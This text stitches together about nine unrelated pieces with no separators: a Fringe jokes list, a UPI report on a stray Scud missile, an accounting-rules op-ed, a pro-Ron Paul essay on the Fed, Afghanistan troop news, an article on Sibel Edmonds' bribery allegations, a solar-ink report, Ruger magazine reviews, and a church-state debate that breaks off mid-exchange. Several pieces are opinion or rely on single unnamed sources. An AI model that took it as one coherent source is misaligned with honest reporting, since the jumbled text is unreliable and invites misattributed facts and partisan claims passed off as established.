Comedian Dan Antopolski has won a prize for the funniest joke of this year 's Edinburgh Fringe .
The funnyman , who has previously been nominated for the Perrier award , picked up the trophy from TV channel Dave .
Nine comedy critics sat through thousands of jokes before choosing 27 for viewers to vote on .
The winning joke was a one - liner from 36 - year - old Antopolski 's show Silent But Deadly - " Hedgehogs .
Why can't they just share the hedge ? "
The Londoner proved popular with critics and viewers and another of his jokes made the top 10 list .
The Top 10 jokes were judged to be : • 1 ) Dan Antopolski - " Hedgehogs - why can't they just share the hedge ? " • 2 ) Paddy Lennox - " I was watching the London Marathon and saw one runner dressed as a chicken and another runner dressed as an egg .
I thought : ' This could be interesting ' . " • 3 ) Sarah Millican -
" I had my boobs measured and bought a new bra .
Now I call them Joe Cocker and Jennifer Warnes because they 're up where they belong . " • 4 ) Zoe Lyons -
" I went on a girls ' night out recently .
The invitation said ' dress to kill ' .
I went as Rose West . " • 5 ) Jack Whitehall - " I 'm sure wherever my dad is ; he 's looking down on us .
He 's not dead , just very condescending . " • 6 ) Adam Hills - " Going to Starbucks for coffee is like going to prison for sex .
You know you 're going to get it , but it 's going to be rough . " • 7 ) Marcus Brigstocke -
" To the people who 've got iPhones : you just bought one , you did n't invent it ! " • 8 ) Rhod Gilbert - " A spa hotel ?
It 's like a normal hotel , only in reception there 's a picture of a pebble . " • 9 ) Dan Antopolski -
" I 've been reading the news about there being a civil war in Madagascar .
Well , I 've seen it six times and there is n't . " • 10 ) Simon Brodkin ( as Lee Nelson ) -
" I started so many fights at my school - I had that attention - deficit disorder .
So I did n't finish a lot of them . "
The judges sat through an average of 60 comedy performances each before creating a shortlist of 27 jokes .
More than 3,000 comedy fans voted , with almost 18 % choosing Antopolski's one - liner .
Antopolski said : " I 'm delighted to get the prize .
Although I have won things before at the Fringe , this definitely means the most to me and that it should unite my loves of hedgehogs , comedy and Dave makes this prize very special . "
The judges also listed some of the worst jokes at this year 's Fringe .
• Carey Marx -
" I 'm not doing any Michael Jackson jokes , because they always involve puns about his songs .
And that 's bad . "
• Frank Woodley - " I phoned the swine flu hotline and all I got was crackling . "
• Alex Maple - " Michael Jackson only invented the moonwalk so he could sneak up on children . " • Phil Nichol - " She 's got a face like a rare Chinese vase - minging . " • Alistair McGowan - " I 've just split up from my girlfriend , which is a shame , because it was a long - standing arrangement .
Perhaps if we 'd sat down a bit more ... "

DAMASCUS , Syria , Aug. 15 ( UPI ) --
Part of a Scud missile jointly developed by North Korea , Syria and Iran landed in a Syrian market in May , killing more than 20 people , a source said .
The missile , one of two developed by the three countries , strayed off course and landed in the market in Manbig , near the border with Turkey in northern Syria , Kyodo News reported , quoting a Western diplomatic source .

Military officials , who blocked access to the area to recover what was left of the missile , told residents there had been a gas explosion , Kyodo said .
More than 60 people were injured , the news service reported .
A Mideastern military source said a problem with the guidance systems caused both missiles to go astray .
The other missile may have landed in a border area between Syria and Iraq , the diplomatic source said .
The launches were from southwestern Syria .
Kyodo reported the three countries are cooperating in trying to improve Scud missiles , developed by the Soviet Union during the Cold War .
Investors have more than one reason to celebrate two new accounting rules .
Besides forcing banks to fess up to the risks they are carrying on their books , new standards for off - balance sheet assets will make it harder for companies to inflate earnings artificially .
The new rules – FAS 166 and 167 – are desperately needed to prevent banks from hiding assets to increase leverage .
Lending that is n’t supported by capital is a main ingredient behind unsustainable credit bubbles , and banks ’ off - balance sheet games played a big role in the most recent one .
But another reason banks like off - balance sheet structures is that it enables them to manufacture profits .
Coming up to the end of a quarter , if a company is a bit short of its earnings target , it can package some assets together into a security and “ sell ” them to an off - balance sheet entity .
The entity is conjured out of thin air with a small equity investment by the company itself .
The entity “ buys ” the securitized assets at a nice markup , enabling the company to book a profit on the sale .
Is it really a sale if the company still owns the risk ?
Of course not .
If I sell an asset to you , a share of stock for instance , then I transfer all the rights of ownership .
Any gains or losses in the stock are yours alone .
With many off - balance sheet entities , however , companies are n’t really transferring risk to anyone else .
They ’re just pretending to do so in order to lever up and recognize a gain .
It ’s the acknowledgment of risks that is most important .
Pushing assets off balance sheet — into the “ shadow banking system ” — put them beyond the reach of regulators , whose job it is to make sure banks have enough capital to absorb losses .
For their part , banks like to fly as close to the sun as possible , operating with as thin a capital cushion as regulators will allow .
This is the essence of leverage .
The more assets a firm controls relative to the equity on its balance sheet , the higher its potential returns on equity .
If you put down 20 percent to buy a house , and the house ’s value appreciates 10 percent , then the return on your equity is a tidy 50 percent .
But if you put down 5 percent , that same 10 percent increase in price is a 200 percent return .
The trouble with this strategy is that it works in only one direction .
If asset prices fall , banks with smaller equity cushions go horizontal rather quickly .
At the height of the bubble , big banks were operating with equity cushions in the range of 2 to 3 percent .
And that was before accounting for off - balance sheet assets .
Since then , banks have raised more capital , putting them in the range of 4 to 5 percent , but bringing assets back on balance sheet will have a meaningful impact .
Citigroup will be adding $ 159 billion of assets , Bank of America $ 150 billion , JP Morgan Chase $ 130 billion and Wells Fargo $ 109 billion .
Goldman Sachs and Morgan Stanley have n’t yet disclosed how much they will be bringing back on , according to their most recent quarterly filings with the SEC .
Unfortunately , and contrary to recent comments about the importance of raising capital from President Barack Obama and Treasury Secretary Timothy Geithner , regulators are considering giving banks a year to phase in these assets for regulatory capital purposes .
This seems foolish .
With equity markets nice and bubbly again , it ’s not very difficult for banks to sell stock .
If regulators make clear that additional capital will be required soon , banks may actpre-emptively to raise it now .
The system will certainly be stronger if they do .
The growing interest in the book soon to be released by Ron Paul named “ End the Fed ” is unprecedented in monetary history , and reveals the extraordinary times we live in where a chance to change the monetary policy in the United States in a way that cold benefit all of us .
What ’s unique at this time is the near collapse of the banking system generated the desire and interest from people in how that could happen ; that created the opportunity from those like Ron Paul who had spent their lives studying and fighting against what the Federal Reserve practices and represents .
Now what ’s extraordinary about this is the Fed has enjoyed – for the most part – operating behind the scenes and in obscurity with almost no one having the name in their minds or talking about it .
So when people talked about the folly and danger represented by the Federal Reserve , it fell on deaf ears , as it simply did n’t compute as to what it was and why we as American citizens should care .
That has probably changed forever now , as the practices of the Fed are starting to be grasped and understood by a growing number of people , and they ca n’t simply just slither back under their rock , even though they ’re trying to do that at this moment by fighting off audits and other means of finding out what ’s under their operational hood .
They prefer to go back to the days where everyone forgets about who they are and what they do , so they can continue to go about their usual business .
So what ’s happening now is the Federal Reserve is under intense scrutiny , and while the intensity will probably ebb and flow through the years , never again will be able to work entirely behind a closed curtain , and if Ron Paul and others have their way , will eventually be led to shutting down and never again be allowed to initiate its failed policies which lead us to an endless series of boom - and - bust periods from which we always have to struggle through .
So how immense are the times we ’re living in in relationship to the Federal Reserve ?
If you ’ve followed or researched the Federal Reserve and books having been written about them over the last 90 years , you ’ll see that quite a few have said similar things as we ’re hearing at this time , but now with Ron Paul we have a representative that actually knows what he ’s talking about and has prepared his entire life for a time like this .
The result are over 280 lawmakers signing on to his H.R. 1207 bill to allow the auditing of the Federal Reserve , an unprecedented accomplishment in the history of the Fed .
Nobody could have ever predicted this type of thing would happen where a politician could write a book saying the Federal Reserve should be abolished and have it achieve what will most likely be ‘ best seller ’ status .
End the Fed from Ron Paul is poised to do just that .
Despite claims earlier in the day from President Barack Obama that no ‘ immediate decision ’ was pending on Afghanistan , Fox News is quoting sources in the government as saying General Stanley McChrystal has already made his long - awaited troop request , and it ’s a doozy .
Gen. McChrystal
Gen . McChrystal is now ‘ privately ’ requesting another 40,000 troops for the eight year old war , which would bring the overall US presence there to well over 100,000 troops , and nearly triple the number in the nation with President Obama was elected last November .
The call ’s “ private ” nature and President Obama ’s protestation that no decision is pending are likely a function of growing Democratic opposition to the escalation .
With polls showing a wide majority of Americans ( and a dramatically larger majority of Democrats ) now firmly against the war , several top ranking Congressmen are questioning the wisdom of continued escalation , and are expressing concern about the lack of concrete plans for an exit strategy .
How well the military is going to be able to cope with the increased number of troops deployed in Afghanistan is unclear , particularly with 131,000 troops still in Iraq ( and more on the way ) .
It had previously been reported that Gen. McChrystal would seek 20,000 more troops for the conflict .
Whistleblower deposed in Schmidt versus Krikorian election complaint
Sibel Edmonds finally gets to tell her story
Source : newsdemocrat.com
8/24/2009
Ohio Second District Congresswoman Jean Schmidt , R - Cincinnati , filed nine election complaints against independent candidate David Krikorian concerning the 2008 election in May this year .
Krikorian opposed Schmidt in the Second District Congressional race as an independent in 2008 and is seeking the Democratic nomination for the 2010 race in April .
The complaints focus on Krikorian 's statements during the election stating that Rep.
Schmidt was taking money from organizations related to the Turkish government in exchange for denying the occurrence of what Krikorian called the Armenian Genocide at the hands of the Turks during World War I .
The complaints also relate to Election Commission records on campaign contributions Schmidt received from the Turkish American Heritage PAC and the Turkish Coalition USA PAC .
Since filing the complaints , Schmidt 's counsel has withdrawn four complaints , and an Ohio Elections Commission three - person panel decided there was probable cause to hear the remaining complaints on Thursday , Aug. 13 .
The five remaining complaints will be reviewed by the entire Commission on Sept.
3 .
In preparation for the Sept. 3 hearing , Krikorian 's lawyer requested a subpoena for well known whistleblower and former interpreter for the FBI , Sibel Edmonds .
The OEC declined to enforce the subpoena , however Edmonds agreed to speak to Krikorian and Schmidt 's lawyers on a voluntary basis .
The video deposition was brought forward by Krikorian 's counsel to provide background on the alleged involvement of the Turkish government in Congressional affairs through blackmail , bribery , and campaign contributions filtered through various organizations .
Edmonds also describes Turkish infiltration of the Pentagon and Air Force .
Edmonds ' deposition is significant because she has twice been " gagged " by a State Secrets exemption from testifying for a 9/11 investigation and a Congressional hearing .
By various Internet bloggers she has been called the most gagged woman in the U.S .
" We were very surprised she was allowed to testify , " said Krikorian about the deposition .
" She was gagged twice under the Bush Administration and we have received several threatening letters from the FBI and the Department of Justice .
To Obama 's and to Eric Holder the Attorney General 's credit she was allowed to testify . "
As the Sept. 3 OEC hearing approaches , the depositions continue .
Licoln McGurdy , Treasurer of the Turkish Coalition USA PAC was the recent subject of a deposition and Schmidt was to be deposed Monday , Aug. 24 .
Edmonds ( who is Turkish - American ) called as a witness for Krikorian ( who is Armenian - American ) testified to infiltration , bribery , corruption , and blackmail within the U.S. Government , by current and former members of the U.S. House and other high ranking officials , on behalf of Turkish interests .
Schmidt , the co-chair of the Congressional Turkish Caucus filed the complaint with the OEC alleging " false statements " by Krikorian when he alleged she had taken " blood money " from those opposed to a Congressional declaration of Armenian Genocide by the Turks during WWI .
There are claims by Krikorian that Schmidt took more money from Turkish interests during the 2008 campaign than any other House candidate .
Below is the video deposition by Edmonds .
Some serious charges are made in this deposition , this newspaper / website provides this as public information that readers / viewers may develop their own opinions and understandings of the subject .
Note most of Edmonds ' deposition is relevant to a time period previous to Rep.
Schmidt taking office .

Sibel Edmonds transcript
Solar cells could soon be produced more cheaply using nanoparticle “ inks ” that allow them to be printed like newspaper or painted onto the sides of buildings or rooftops to absorb electricity - producing sunlight .
Brian Korgel , a University of Texas at Austin chemical engineer , is hoping to cut costs to one - tenth of their current price by replacing the standard manufacturing process for solar cells – gas - phase deposition in a vacuum chamber , which requires high temperatures and is relatively expensive .
“ That ’s essentially what ’s needed to make solar - cell technology and photovoltaics widely adopted , ” Korgel said .
“ The sun provides a nearly unlimited energy resource , but existing solar energy harvesting technologies are prohibitively expensive and cannot compete with fossil fuels . ”
For the past two years , Korgel and his team have been working on this low - cost , nanomaterials solution to photovoltaics – or solar cell – manufacturing .
Korgel is collaborating with professors Al Bard and Paul Barbara , both of the Department of Chemistry and Biochemistry , and Professor Ananth Dodabalapur of the Electrical and Computer Engineering Department .
They recently showed proof - of - concept in a recent issue of Journal of the American Chemical Society .
The inks could be printed on a roll - to - roll printing process on a plastic substrate or stainless steel .
And the prospect of being able to paint the “ inks ” onto a rooftop or building is not far - fetched .
“ You ’d have to paint the light - absorbing material and a few other layers as well , ” Korgel said .
“ This is one step in the direction towards paintable solar cells . ”
Korgel uses the light - absorbing nanomaterials , which are 10,000 times thinner than a strand of hair , because their microscopic size allows for new physical properties that can help enable higher - efficiency devices .

In 2002 , he co-founded a company called Innovalight , based in California , which is producing inks using silicon as the basis .
This time , Korgel and his team are using copper indium gallium selenide or CIGS , which is both cheaper and benign in terms of environmental impact .
“ CIGS has some potential advantages over silicon , ” Korgel said .
“ It ’s a direct band gap semiconductor , which means that you need much less material to make a solar cell , and that ’s one of the biggest potential advantages . ”
His team has developed solar - cell prototypes with efficiencies at one percent ; however , they need to be about 10 percent .
“ If we get to 10 percent , then there ’s real potential for commercialization , ” Korgel said .
“ If it works , I think you could see it being used in three to five years . ”
He also said that the inks , which are semi- transparent , could help realize the prospect of having windows that double as solar cells .
Korgel said his work has attracted the interest of industrial partners .
Funding for the research comes from the National Science Foundation , the Welch Foundation and the Air Force Research Laboratory .

Product Reviews
Click here to review this item Just ordered 2 mini mags for my mini 14 Im giving 3 stars cause its middle ground and i had to choose something in order to leave a message with that said I just ordered 2..10 round mags for my mini 14 so i will be back to give my review but so far my 5 round mag has ran smooth .
I did however get some promag 10 rounders today and after just loading Im already over them .
One magazine the bottom popped off as i was loading it ... got it back on and was able to load it but Im not confident about running it without some sort of issue arising .
Neither mag seemed to wanna take my 556 ammo unlike my 5 round Ruger mag that has no issues with either 223 or 556 so Im gonna assume the 10 round mags will do the same .
I will be at the range this weekend to sight a new scope and will see how these promags run so i can compare to the rugers i just ordered .
Definitely wanna see if i have any of the issues Ive read about .
Great mag , use your head A little mechanical reasoning comes into play here .
5rd mags have about a 1 cartridge reserve , allowing them to be inserted with the bolt closed or open .
Once you move to a 10 round , you dont have this reserve as the spring is bottomed out .
In addition , the physical length of the 10rd gives you leverage to crush your top round .
OPEN BOLT for 10 and up .
updated review , 3 magazines later ...
Firstly , to the folk who try to blame operator error , especially in GASP !
inserting a loaded magazine with a closed bolt ...
Are you crazy ?
Just run around with a bolt locked open for anything to fall in open action ?
Or drop the bolt on the now inserted magazine , and run around with it cocked and locked ?
Did you know Ruger also says in manual magazines may be inserted bolt open OR CLOSED ?
You live in a world where a 10rd magazine may only actually be carried with 9 , and swallow that lie ?
Back to magazines , Ruger sent two more , including one which was reputedly test fired even though shiny new in stapled package ... both did same as first , unable to cycle manually slowly or fast and not trap / dent / bend rounds , and then I bought an aftermarket which was no improvement or detraction at all ...
So , went to range with all four , pondering mag mods and follower swaps , and thought to check out the most hopeful one or two ...
All four mags inserted and locked on my 580 with bolt closed ... all stuck bolt to rear on charging , which is difficult against top round pressure against bolt ... all required a sharp blow to slide handle to close action ... all successfully chambered first round ...
And all fired all 10 without a hitch , gouged brass shoulders and all , gouging which never happens with 5rd and 20rd who insert fully loaded with bolt closed and not even noticed which bolt condition ...
So .... they work ... barely , but they work ... further testing has shown nothing but the same ... wrecks brass , but works , if charging hand not weak and can overcome suchlike hammer dragging with sand in action , then can overcome magazine force when charging ... whacking the handle is automatic with us older gun users .
So , folk who need , or will need in future , 10 rd magazines to be legal , are not orphans as much as initially thought ... but only missing it by THAT much ... should be a lot better ...
Meanwhile , considering this gun is flawless with the good 5rd and 20rd mags , and also successfully feeds / fires even with jam - o - matic 10rd mags which try to fold rounds into chamber , denting and gouging every round , I am some kinda impressed with the gun , which functions somehow even with THE worst magazines .... hard to beat that .
Bob Totally reliable gun until I tried a new 10rd hard to insert fully loaded , so much tension and what appears too sharply bent left side feed lip , that it will not feed without bolt jiggling and handle slapping .
Fires next 9rds but jams on hand cycling nearly entire magazine .
Given locals already require 10rd max and entire nation under constant threat of same , it would be nice if a new mag straight from a dist .
Fall 2019 was trustworthy , but this mag is not .
Ruger does not want it back and acts as if out of their hands since a 3rd party supplier .
Which is a ridiculous attitude since them fully capable yanking a contract and giving it to somebody who can properly do the job .
Will update if replacement works better .
Turns out internet quite full of problem 10rd reports , and non-functioning replacements .
Bob MINI - 14 10 - Mag .
Ive read all reviews and agree with the difficulty chambering a topped - off 10 - mag .
into the Mini - 14 with the bolt closed ; but with all due deference to RUGER , et .
al .
Page 21 of my instruction manual clearly states in item 2 ..... [ Before inserting loaded mag ...
ENGAGE THE BOLT OPEN ......!!!].
Nuff Said .
THE DOC
No problems
People your bolt has to be open read your manual .
I have two works great - Dan R , NJ Good magazine would recommend to friends
These 10 round mags work just fine no problem at all .
Anyone having trouble with using 10 rounds should read the rifles owner manual .
- Dan R , NJ
Not up to Rugers standards I bought two of these , they only work 100 % when downloaded to 8 rounds .
Both my factory 5 round and all 3 of my factory 20 round magazines load , lock and feed 100 % at full capacity .
Ive gone to the aftermarket for 10 round magazines .
Mini 14 10 round Magazine Just bought two 10 round magazines for my Mini 14 .
Both work great .
I have found them to be easy to use .
Paul Keveny
Same here ...
Mag wont eject
Its all been said before ... now its my turn ... what is everybody doing ?
is it the gun or is it the magazine ?
- Unlucky , NY Works great for 9
Works perfectly with 9 rounds ; jams the first round just as perfectly with 10 .
RinNY 10 round problem with closed bolt I have the same problem as others .
Cannot insert a full 10 round mag with the bolt closed .
Ranch Rifle purchased new in 2014 .
Loading with a closed bolt and a round in the chamber is called a speed reload .
Its done all the time in competition shooting .
Puts me at a big disadvantage to the ar15 guys .
And I did read the manual .
Page 16 : The magazine may be inserted with the bolt either in the closed or open position - Alfred , NY Read the ownwers instruction manual Alot of reviewers are complaining about not being able to load the magazines without the bolt open .
Read the manuals .
My 188 Mini 14 and 583 Mini 30 both instruct to open and lock the bolt before mag insertion .
Been running the M - 14 for 22 years with zero mag problems .
- John , CO
Tight going in impossible to get out Went to the range with my new 10 round magazine today .
Went through three 5 round mags with no problem .
I loaded the 10 round and was a very tight fit but did lock in place .
Fired the 10 rounds and could not remove the mag .
Called Ruger and was advised to try to knock it out from the top .
Rather than remove the scope I elected to begin to take the gun apart .
As soon as I pulled the trigger guard the mag fell out .
Just to be sure I put the gun back together and retried the mag , same issue .
Im open to any ideas .... - Randy , CA
Does not fit my 182 series
Add me to the list .
Bought one at my local gun store .
When it seemed to lock in place , it really locked .
Could not remove it .
Had to take it back and they used a punch on the mag lock lever to remove .
Called Ruger .
They sent another one .
Same problem .
For my rifle , these are completely unusable .
Factory 5 round mag is fine .
Earlier aftermarket 20 rounders were fine , but now legislated out of existence in my state .
Bummed out that Ruger cant get this right .
Works great
Have been using this magazine for several months and several hundred rounds .
Works flawlessly .
T. Muncel Junk
New gun new mag only fits 8 rounds smashed up my ammo and jams up my rifle .
Junk .
This is my first time purchasing a Ruger and I cant stake my life on this magazine .
CA
Does not fit 181 series Purchased this item locally and was pretty sure it would fit my 181 series .
It didnt .
Looking at the the back of the magazine and comparing it to the stock five rounder , it became apparent there is a difference .
The ten rounder has a protruding rectangular tab rather than a rounded stamped tab .
The rectangular tab is much wider than the stock model .
If you smack the mag from the bottom , it will lock in place ; but will get stuck .
To un-jam , hit the mag release with a hard plastic mallet .
Item may be ok for later models , but definitely not made for the 181 .
Fred Motta Works
Well I ordered two of the 10 - round magazines and they had no issues .
They work as well as the 5 - round magazine .
5.56 ammunition was used .
- John , CA Fit and finish is good Build quality is just as good as the 30 Rounders , fits in my mini as long as the bolt is open .
Ruger should make these a touch longer so you can put it in your mini with the Bolt being closed .
this issue almost makes it a de facto 9 rounder which is not cool !
- Dale , CA 9 aint 10 I paid the exorbitant price for the genuine Ruger 10 round mag for my 2016 Mini 14 .
Its advertised to hold ten rounds but says nothing about not fitting into the gun if you do with the bolt closed .
The 5 round holds 5 and the 20 round holds 20 all with no problem bolt open or closed .
Do not buy these magazines if you actually expect them to hold 10 rounds as advertised .
- john , CA 10 round - failure to feed Poor finish .
What looks like rust on the inside .
Fails to feed 2 - 3 rounds every magazine .
I purchased 2 10 rd. both FTF .
5 round mags work perfectly .
- Gary , CA Mini 14 10 round mag
Okay so the mixed reviews are there for a reason ..
The magazines I purchased only work if loaded into the mini with the bolt open .
Also its worth noting that they do seem to be a much tighter fit then their 5 round counterparts making changing mags slightly more difficult .
That being said they are technically functioning 10 round mags .
- Steve D , NJ Disappointed
Just bought one of these at a local gun shop , and it will not properly fit into my mini 14 .
This is the case with mag empty and bolt open or closed .
The mag will not seat properly and latch into the mechanism .
The factory 5 round mag functions properly .
Very disappointing , especially in view of the high - end price of this product .
Was expecting better of the Ruger brand .
Absolute Junk
This magazine does not and will ; not fit the mini-14 Target Rifle , there is not enough clearance behind thew magazine to be able to push the mag release lever forward leaving you with a stuck mag in the rifle .
The only way to get the thing out is to pry behind the release lever with a screwdriver and even then it is a pain in the ass , I find it rather insulting to the Ruger Brand to offer such a piece of crap and dare price it at $ 40 .
bucks
Bah what a joke !. - marti , CA Functions Well
Thought I would add my experience with these magazines in my new Mini - 14 tactical .
I was a little reluctant to buy them given the reviews on this site .
I purchased two and thus far have had no problems whatsoever .
They insert and remove exactly the same way as the 5 round mags that came with the rifle .
They have also functioned without incident , and seem to be very close in quality and fit and finish to the 5 round magazines .
I have no problem recommending these mags .
- Joe , VA Bolt Open please
As stated in an earlier review , there is a reason the bolt locks to the rear after last round is spent ...
10 , 20 , 30 round mags headspace are designed to fit into the magazine well with an open bolt .
No different with ARs , M - 16A1 , A2 or any other variant .
Works as it should Bought two of these 10 round magazines in 2016 .
Ran them with a 583 series Mini 14 .
Pros : Holds all 10 rounds and feeds perfect .
55 - 62 grain ammo was used .
Easy to take apart for cleaning .
Con : Expensive and almost the same price as 20 round magazines .
All of my experience with other brands has always disappointed .
I wont buy them anymore .
As far as not being able to load a topped off magazine ?
Tip .
Load the magazine into the rifle with the bolt locked open .
Problem solved .
- Jeff , CA Perfect
Have several .
No issues .
- Edward , NY Beware !
Beware .
I received three of these 10 round mags .
They are not made to the same spec as the 5 and 20 round mags .
They didnt fit properly in my mini .
A waste of money .
Buy the 5 round mag if you cant get the 20 .
THOMAS C DW Junk ... It smashes the shells - Mark Elkholm , KY The only 10 round mag worth purchasing !
Im sorry but the other reviews complaining about it being a 9+1 mag are silly .
all of the aftermarket mags have flaws that are far more unappealing .
the promag wobbles and rock in and out of position if you apply pressure to the bottom , for one example .
That is unacceptable for prone position .
The ruger factory 10 round mag falls securely into place .
No wiggling , no rocking .
The gun is designed to be reloaded with the action open .
After your last shot , the action stays open for a reason .
As long as the action is open , you can load all 10 rounds .
dont try to force 10 rounds into the gun with the action closed which doesnt make sense to do anyways , because you will end up crushing the top bullet against the bolt .
this mag is sturdy , reliable , and as long as you use it the way it was intended , you will find that you have a very good mag .
I question why ruger doesnt sell any of the mini 14s with a 10 rounder .
James
Poor 10 round mag I bought one and had to call Ruger and send it back ...
They sent another ... it also did not function correct ... Ruger is clueless ... look at all the bad reviews .
Yet they still continue to sell a faulty product Dan 10 round magazines wont seat w/10 rds in & action closed .
The10 rnd mags wont seat w/10 rnds in & action closed .
They dont feed rounds properly - jams a lot .
They are flimsily made - one mag fell apart during use .
A lot of issues for this item .
Hope the folks at ruger are working to fix them .
- G. Holbrook , CA High Quality Magazine I just loaded 10 rounds into my new magazine and it seated with no problems in my Ruger Mini 14 with Bolt closed .
It is a new rifle 2015 and a new magazine .
Quality fit and finish .
I read the previous reviews and did not have the same issues they had .
I will purchase more of these magazines .
- Matt McCurdy , CA Completely Useless Magazine I cant even seat this magazine in my Mini 14 .
Improper fit .
Completely unserviceable .
- WILLIAM HAWTHORNE , CO love these bought 5 and havnt had one problem .
no missfires .
fit perfect .
Very Disappointed
Paid close to a hundred bucks for 2 of these including shipping but first empty mag I pop in becomes severely jammed .
Bolt was closed and in effort to free mag , I opened bolt and now bolt will not close .
This is my first negative experience with an otherwise quality firearm manufacturer , but this is a big one .
- Gregory Lee , CA CANNOT LOAD 10 RNDS WITH BOLT CLOSED
What a joke in my opinion .
This Ruger magazine can hold 10 rounds , but you CANNOT lock it in with the bolt closed .
I have a new Mini 14 .
I had purchased two of these 10 round magazines from Big 5 in CA ... DISSAPOINTING to say the least .
Wonder how / why Ruger can manufacture such a thing that fails to serve its intended purpose ... I hope that Ruger firearms are product tested much better than their magazines or Im going to be reluctant to purchase anything else Ruger .
BTW I NEVER review products , but this is ridiculous !
You can load 9 , but try 10 & you will dent / ding the casing & never get the magazine to lock .
It may be fine with some people , but I think its idiotic .
Who knows ... hope it feeds better than it loads & locks ?
Mike Brand - new 10 - round Ruger magazines will not fit into new Mini - 14 Brand - new 10 - round Ruger magazines will not fit into new Mini - 14 .
They will not seat in the magazine well , and Im talking about empty mags , and with the bolt open or bolt closed , either way they wont fit .
The 5 - round magazine fits fine , but none of the 10 - round mags fit .
If you force the magazine in by pounding it in , not only does it jam the bolt of the rifle , but the magazines wont eject .
Poorly made , poorly fitting .
- D W , NJ Cannot load 10 and insert with bolt closed
You cannot load 10 rounds in this mag and insert it into the rifle with the bolt closed .
The mag will not seat , and the top cartridge in the mag will get crushed .
You will need to download the mag if you want to load it into the rifle with the bolt closed .
Disappointing for those of us in states like NY who are limited to 10 rounds .
For the price , they should hold 10 as advertised .

Bruce Ledewitz recently organized a provocative panel at the Netroots Nation convention in Pittsburgh entitled “ A New Progressive Vision of Church and State — How I Learned to Accept ‘ Under God ’ in the Pledge of Allegiance and Stop Losing Elections ” ( video here ) .
While his proposal is not brand new , it is perhaps new to most progressives who have in recent decades bought into the model of the high wall of separation between religion and secular public life .
He is impatient with the place , or really lack of place , accorded religion in American democratic life , especially among self - identified progressives .
Ledewitz is onto something in his intuition that the metaphor of a high wall of separation between religion and secularism is past its prime .
Frederick Clarkson , apparently , wants no part of it .
He fears that abandoning the wall of separation will inevitably lead to conservative religious forces using government to endorse God , if not the Bible and Christianity too .
He concludes that we need to hold on to a model of public space free of religious imagery .
But are these the only alternatives ?
Can we loosen up the presumption that religion does not ever belong within public spaces , and yet remain on guard against government use of religious discourse ?
Below , Bruce Ledewitz , panel organizer and Professor of Law at Duquesne University , Linell Cady , co-editor of Religion Dispatches and Professor of Religious Studies at ASU , and Frederick Clarkson , veteran religion writer and co-founder of Talk to Action , debate the implications of a shift in the progressive perspective on the proper relationship between church and state .
( You can find participants ’ full biographies in upper right corner ) .
___________________________________
The Netroots Nation panel description :
The old liberal vision of a total separation of religion from politics has been discredited .
Despite growing secularization , a secular progressive majority is still impossible , and a new two - part approach is needed — one that first admits that there is no political wall of separation .
Voters must be allowed , without criticism , to propose policies based on religious belief .
But , when government speaks and acts , messages must be universal .
The burden is on religious believers , therefore , to explain public references like “ under God ” in universal terms .
For example , the word “ God ” can refer to the ceaseless creativity of the universe and the objective validity of human rights .
Promoting and accepting religious images as universal will help heal culture war divisions and promote the formation of a broad - based progressive coalition .
Frederick Clarkson :
Thanks for hosting this discussion , Linell .
I think these matters are integral to the functioning , the advance , and indeed the survival of Constitutional democracy .
But I think that in order to give them the kind of attention they merit in light of the particular challenges of our time , we need to begin at a different place than Bruce proposes .
First , the general ideas of “ religion and public life ” and “ separation of church and state , ” while related , are primarily different matters .
I think we risk confusion and distortion of the important issues at stake and our ability to discuss them in meaningful ways if we conflate them .
So let me begin by trying to sort it out a bit .
I think that those who have bought into and advocate , as you put it , a “ separation of religion and secular public life ” are relatively few and in any case , of little actual consequence in our national life .
I thought that maybe we had dispensed with this argument in the wake of Jim Wallis ’ book God ’s Politics in which he claimed that “ secular fundamentalists ” and “ the secular left ” were a tremendous problem on a par with the religious right .
Wallis and his supporters have been repeatedly invited , nay , challenged to supply actual evidence in support of such claims , but none has been forthcoming .
Bruce made a similar claim in announcing our panel at Netroots Nation , stating : “ The old liberal vision of a total separation of religion from politics has been discredited . ”
Since there is no such liberal vision , it seems to me that saying it has been discredited is more of an acknowledgement that it never existed in the first place .
Let ’s resist trying to solve problems said to be associated with a broad phenomenon that no one can document or even describe .
But allow me to briefly expand on a deeper problem Bruce referenced in his report on our panel :
This is an internalization of that old - time framing of the religious right itself ; and a peculiar adaptation of their claim that liberals are godless communists , or witting or unwitting agents thereof .
Rightist commentators like Bill O’Reilly blow this dog whistle all the time — slyly referring to “ secular progressives ” and “ the secular left , ” as though progressives were solely secular while conservatives have God on their side .
Linguist George Lakoff has famously observed that we hamstring ourselves in communicating our values if we adopt the framing of the arguments of those who do not share them .
So let ’s not .
Let ’s also consider that there are many non-religious conservatives in public life — notably , many of the followers of such influential thinkers as Ayn Rand and Leo Strauss .
Additionally , there are obviously many religious progressives in public life , and there always have been .
The false frame breaks down in light of the compelling evidence of facts .
As for the wall of separation of church and state as an authoritative way of discussing the establishment clause of the First Amendment — yes , let ’s keep the wall high and strong .
As Sandra Day O’Connor put it : “ Those who would renegotiate the boundaries between church and state must therefore answer a difficult question : why would we trade a system that has served us so well for one that has served others so poorly ? ”
Indeed , but let ’s go deeper on this point too .
The First Amendment was a clarification of the first principles inherent in the Constitution itself , notably in Article Six ; which is the only place in our founding document where religion is even mentioned .
But what a profound mention it is !
It introduced the first principles of a moral and Constitutional high ground that have allowed us to advance a more just society , principles that continue to powerfully animate the progressive vision and our best approaches to the challenges of our own time .
Article Six declared that there shall be no religious tests for public office .
This meant that for the first time in the history of the world , one ’s religious views , or lack thereof , were irrelevant to one ’s status as a citizen .
Among the first principles inherent in Article Six are religious equality ( meant here in the broadest sense to include the non-religious ) and religious pluralism — the recognition that our society holds to , values , and protects a variety of views .
Therefore , the disentangling of institutional churches and their views from the coercive power and undue influence of the state was one of the central tasks of the new nation .
Historian Garry Wills writes that the framers drew on many sources in drafting the Constitution , but they invented only one thing : separation .
The religious right likes to pretend that the framers of the Constitution meant something different than all this — and it is this pretense , and the associated revisionist history of Christian nationalism behind it , that drives much of our contemporary debate on these matters .
But the clear and unambiguous first principles of the Constitution were and are the best guarantee of our right to figure it all out for ourselves , and our best defense against the rear guard action being waged by the religious right and its allies in our time .
So , sure , let ’s have public religious and non-religious expressions in all of their richness and variety .
But let ’s also confront and defeat anything that would erode , in fact or appearance , the role of the government as the uncompromised guarantor of the rights of all .
Linell Cady : Fred , I completely agree that we need to keep distinct the difference between the specific issue of church - state relations and the broader question of religion and politics and public life more generally .
According to Bruce ’s report , the model you advocated for progressives was “ a public space without reference to religious imagery . ”
It sounds to me , then , that we all agree that this strong model of privatizing religion is not compelling .
